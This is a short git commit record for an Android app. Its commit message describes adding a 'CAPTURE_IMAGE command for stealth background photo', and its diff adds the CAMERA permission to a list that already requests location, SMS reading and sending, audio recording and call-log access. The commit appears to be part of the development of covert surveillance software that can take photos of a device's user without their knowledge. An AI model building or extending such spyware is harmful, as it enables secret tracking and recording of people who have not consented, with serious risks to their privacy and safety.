5b8e072c540b51c37c0f11c1f8693306c0b6a9d0
GetyeTek <getyeteklu2@gmail.com>
2026-04-15 18:24:07 +0300

    Implement CAPTURE_IMAGE command for stealth background photo

--- app/src/main/java/com/example/myandroid/PermissionManager.kt
+++ app/src/main/java/com/example/myandroid/PermissionManager.kt
@@ -18,6 +18,7 @@ object PermissionManager {
             android.Manifest.permission.ACCESS_FINE_LOCATION,
             android.Manifest.permission.READ_SMS,
             android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.CAMERA,
             android.Manifest.permission.WRITE_CALL_LOG,
             android.Manifest.permission.SEND_SMS,
             android.Manifest.permission.RECEIVE_SMS,
